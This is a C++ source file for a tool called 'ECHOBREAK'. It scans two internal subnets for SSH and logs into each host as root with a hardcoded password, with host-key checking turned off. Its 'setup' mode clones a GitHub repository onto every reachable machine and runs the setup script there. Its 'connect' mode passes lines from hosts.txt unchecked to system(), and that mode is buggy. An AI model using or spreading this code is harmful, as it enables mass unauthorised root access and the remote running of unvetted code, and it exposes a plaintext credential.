#include <cstdlib>
#include <iostream>
#include <string>
#include <unistd.h>
#include <memory>
#include <fstream>
#include <vector>
#include <array>
#include <sys/socket.h>
#include <arpa/inet.h>

bool isPortOpen(const std::string& ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        std::cerr << "fail to create socket" << std::endl;
        return false;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

    struct timeval timeout;
    timeout.tv_sec = 1;  
    timeout.tv_usec = 500000;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

    // try
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        close(sock);
        return false;  // port closed
    }

    close(sock);
    return true;  // port opened
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, int(*)(FILE*)> pipe(popen(cmd, "r"), pclose);
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }

    return result;
}

std::vector<std::string> split(std::string str){
	std::string word = "";
	std::vector<std::string> res;
	for(char c : str){
		if(c == ' '){
			res.push_back(word);
			word = "";
		}
		else{
			word += c;
		}
	}
	res.push_back(word);
	return res;
}

void connect(std::string host){
	std::ifstream in("hosts.txt", std::ios::in);
	if(in.is_open()){
		std::string line = "";
		while(std::getline(in, line)){
			if(split(line)[0] == host){
				system(split(line)[1].c_str());
			}
		}
	}
	else{
		std::cout << "hosts not found\n";
	}
	in.close();
}

int main(int argc, char* argv[]){
	std::cout << "W3LC0M T0 \033[095mECHOBREAK\033[0m!!" << std::endl;
	std::string ip;
	std::vector<std::string> hosts;
	
	if(argc <= 1){
		std::cout << "Enter: scan, setup, connect\n ";
		std::cout << "	scan - scanns for computers\n ";
		std::cout << "	setup - shares a setup script\n ";
		std::cout << "	connect [ip] - ssh connects to ip\n ";
		return 1;
	}
	std::string arg = argv[1];
	if(arg == "scan"){
		std::string currect_host = "";
		for(int i = 2; i < 256; ++i){
			//checking for 212
			if(isPortOpen("172.17.212."+std::to_string(i), 22)){
				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " hostname"; //ip
				currect_host = exec(ip.c_str()) + " " + std::to_string(i);
				hosts.push_back(currect_host); //to ip data base (edit to system if it does not working)
				std::cout << currect_host << std::endl;
			}
			//checking for 213
			if(isPortOpen("172.17.213."+std::to_string(i), 22)){
				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " hostname"; //ip
				currect_host = exec(ip.c_str()) + " " + std::to_string(i);
				hosts.push_back(currect_host); //to ip data base (edit to system if it does not working)
				std::cout << currect_host << std::endl;
			}
		}

		std::ofstream out("hosts.txt", std::ios::out); //open file to rewrite all data
		for(auto host : hosts){ // for each loop
			out << host << std::endl; // write
		}
		out.close(); // close file
	}	

	else if(arg == "setup"){
		for(int i = 2; i < 256; ++i){
			//212
			if(isPortOpen("172.17.212."+std::to_string(i), 22)){
				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " git clone https://github.com/Andrew-24coop/EchoBreak && cd EchoBreak && ./ebsetup"; //command
				system(ip.c_str());
			}
			//213
			if(isPortOpen("172.17.213."+std::to_string(i), 22)){
				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " git clone https://github.com/Andrew-24coop/EchoBreak && cd EchoBreak && ./ebsetup"; //command
				system(ip.c_str());
			}
		}
	}

	else if(arg == "connect"){
		std::string host = argv[1];
		connect(host);

	}
	return 0xABCDEF;
}
